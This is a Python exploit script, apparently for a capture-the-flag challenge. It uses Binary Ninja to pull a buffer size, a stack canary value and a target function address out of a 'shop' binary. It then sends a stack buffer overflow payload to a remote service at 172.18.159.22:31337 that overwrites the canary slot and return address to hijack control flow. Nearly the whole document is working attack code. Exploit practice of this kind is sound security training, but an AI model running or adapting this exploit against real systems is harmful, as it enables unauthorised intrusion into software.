#!/usr/bin/env python3
import binaryninja
from pwn import *

import sys


def select_shop(shop_no):
    io.sendlineafter(b"Which shop do you want to enter: ", str(shop_no).encode())


def create_basket(payload):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"basket : ", payload)


def restore(filename):
    io.sendlineafter(b">> ", b"6")
    io.sendlineafter(b"tag : ", filename)


def viewBasket():
    io.sendlineafter(b">> ", b"2")


if len(sys.argv) < 2:
    print("Usage: binja.py <shop_index>")
    exit(1)

index = sys.argv[1]
bv = binaryninja.load("shop-{}".format(index))


# First identity function with two memset calls
def identify_memset_callsite():
    funcs = bv.functions
    for func in funcs:
        count = 0
        callees = func.callees
        for callee in callees:
            if callee.name == "memset":
                count += 1
        if count == 2:
            return func


def overflow_buffer_size():
    func = identify_memset_callsite()
    if func is None:
        print("Unable to find functions with two memset")
        exit()

    return func.call_sites[1].hlil.params[2].constant


def canary_value():
    data_section = bv.get_section_by_name(".data")
    end = data_section.end
    start = data_section.start
    for address in range(start, end, 8):
        value = bv.read_int(address, size=8)
        if value != 0:
            return value


def get_view_function():
    funcs = bv.functions
    for func in funcs:
        for callee in func.callees:
            if callee.name == "closedir":
                return func


buffer_size = overflow_buffer_size()
canary = canary_value()
view_function = get_view_function()

print(f"Buffer Size: 0x{buffer_size:x}")
print(f"Canary Value: 0x{canary:x}")
print(f"Got View function: 0x{view_function.start:x}")

io = connect("172.18.159.22", 31337)
select_shop(index)
create_basket(b"a" * (buffer_size) + p64(canary) + p64(view_function.start))
io.sendlineafter(b">> ", "2".encode())
io.recvuntil(b"Available baskets: \n")

basket = []
while True:
    name = (io.recvline()).decode("utf8").strip()
    if "Fruit" in name:
        break
    if len(name) > 0:
        basket.append(name)

print(str(basket))
io.close()
